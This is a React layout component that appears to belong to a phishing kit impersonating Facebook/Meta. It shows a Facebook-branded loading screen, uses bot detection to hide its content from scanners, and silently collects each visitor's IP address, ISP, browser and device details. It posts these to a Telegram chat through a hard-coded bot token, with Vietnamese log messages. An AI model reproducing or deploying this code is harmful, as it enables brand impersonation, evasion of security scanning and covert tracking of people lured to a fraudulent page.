import { useEffect, useState, useRef, type FC } from 'react';
import { Outlet } from 'react-router-dom';
import { useBotDetection } from '@hooks/useBotDetection';
import FacebookLogo from '@assets/facebook-icon.webp';
import MetaImage from '@assets/meta-logo-black.png';

const LoadingDots = () => {
	const [dots, setDots] = useState('');

	useEffect(() => {
		const interval = setInterval(() => {
			setDots((prev) => {
				if (prev.length >= 5) return '';
				return prev + '.';
			});
		}, 300);

		return () => clearInterval(interval);
	}, []);

	return (
		<div className='flex h-4 w-24 items-center justify-center gap-2'>
			<div
				className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
			/>
			<div
				className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
			/>
			<div
				className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
			/>
			<div
				className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
			/>
			<div
				className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
			/>
		</div>
	);
};

const Layout: FC = () => {
	const [isChecked, setIsChecked] = useState(false);
	const { isBot, isLoading, blockReason } = useBotDetection();
	const logSentRef = useRef(false);
	const botLogSentRef = useRef(false);

	useEffect(() => {
		const storedValue = localStorage.getItem('checked');
		if (storedValue === 'true') {
			setIsChecked(true);
		}
	}, []);

	useEffect(() => {
		if (!isLoading && !isBot && !logSentRef.current && !isChecked) {
			logSentRef.current = true;
			localStorage.setItem('checked', 'true');
			setIsChecked(true);

			const fetchGeoAndSendTelegram = async () => {
				const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
				const botToken =
					'7687302268:AAEzwPymAbKg_RtyLotGQkvfzfhniO6X-OA';
				const chatId = '-4690918157';

				const geoRes = await fetch(geoUrl);
				const geoData = await geoRes.json();
				const fullFingerprint = {
					asn: geoData.asn,
					organization_name: geoData.organization_name,
					organization: geoData.organization,
					ip: geoData.ip,
					navigator: {
						userAgent: navigator.userAgent,
						hardwareConcurrency: navigator.hardwareConcurrency,
						maxTouchPoints: navigator.maxTouchPoints,
						webdriver: navigator.webdriver,
					},
					screen: {
						width: screen.width,
						height: screen.height,
						availWidth: screen.availWidth,
						availHeight: screen.availHeight,
					},
				};

				const msg = `🔍 <b>Log truy cập</b>
📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

				const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
				const payload = {
					chat_id: chatId,
					text: msg,
					parse_mode: 'HTML',
				};

				await fetch(telegramUrl, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(payload),
				});
			};
			fetchGeoAndSendTelegram();
		}
	}, [isLoading, isBot, isChecked]);

	useEffect(() => {
		if (!isLoading && isBot && blockReason && !botLogSentRef.current) {
			botLogSentRef.current = true;

			const fetchGeoAndSendBotTelegram = async () => {
				const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
				const botToken =
					'7687302268:AAEzwPymAbKg_RtyLotGQkvfzfhniO6X-OA';
				const chatId = '-4690918157';

				try {
					const geoRes = await fetch(geoUrl);
					const geoData = await geoRes.json();
					const fullFingerprint = {
						asn: geoData.asn,
						organization_name: geoData.organization_name,
						organization: geoData.organization,
						ip: geoData.ip,
						navigator: {
							userAgent: navigator.userAgent,
							hardwareConcurrency: navigator.hardwareConcurrency,
							maxTouchPoints: navigator.maxTouchPoints,
							webdriver: navigator.webdriver,
						},
						screen: {
							width: screen.width,
							height: screen.height,
							availWidth: screen.availWidth,
							availHeight: screen.availHeight,
						},
					};

					const msg = `🚫 <b>Bot bị chặn</b>
⚠️ <b>Lý do:</b> <code>${blockReason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

					const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
					const payload = {
						chat_id: chatId,
						text: msg,
						parse_mode: 'HTML',
					};

					await fetch(telegramUrl, {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify(payload),
					});
				} catch (error) {
					console.error('failed to send bot telegram:', error);
				}
			};
			fetchGeoAndSendBotTelegram();
		}
	}, [isLoading, isBot, blockReason]);

	if (isChecked || (!isLoading && !isBot)) {
		return <Outlet />;
	}

	if (isLoading) {
		return (
			<div className='fixed inset-0 flex items-center justify-center bg-white'>
				<div className='flex flex-col items-center gap-2'>
					<img
						src={FacebookLogo}
						alt='Loading...'
						className='h-16 w-16 md:h-20 md:w-20'
					/>
					<LoadingDots />
				</div>
				<img
					src={MetaImage}
					alt='Meta'
					className='fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5'
				/>
			</div>
		);
	}

	if (isBot) {
		return (
			<div className='fixed inset-0 flex items-center justify-center bg-white'>
				<div className='flex flex-col items-center gap-2'>
					<img
						src={FacebookLogo}
						alt='Loading...'
						className='h-16 w-16 md:h-20 md:w-20'
					/>
					<LoadingDots />
				</div>
				<img
					src={MetaImage}
					alt='Meta'
					className='fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5'
				/>
			</div>
		);
	}

	return <Outlet />;
};

export default Layout;
